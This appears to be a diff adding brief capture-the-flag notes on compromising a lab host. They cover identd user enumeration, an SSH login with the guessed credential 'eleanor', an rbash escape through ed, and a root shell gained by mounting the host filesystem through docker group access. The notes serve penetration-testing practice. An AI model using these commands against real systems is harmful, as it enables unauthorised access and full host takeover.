@@ -1,0 +1,16 @@
+192.168.148.60
+22, 113:ident, 5432: PostgreSql, 8080:http, 10000
+
+foothold:
+identd reveals user eleanor
+all of the ports are fucking rabbit holes except for ssh
+ssh eleanor@ip password:eleanor
+footholded
+
+privesc:
+escaping rbash with ed editor: !/bin/bash
+export PATH=/bin:/usr/bin
+id shows eleanor is in docker group
+docker image shows redmine
+docker run -v /:/mnt --rm -it chroot /mnt /bin/sh
+rooted
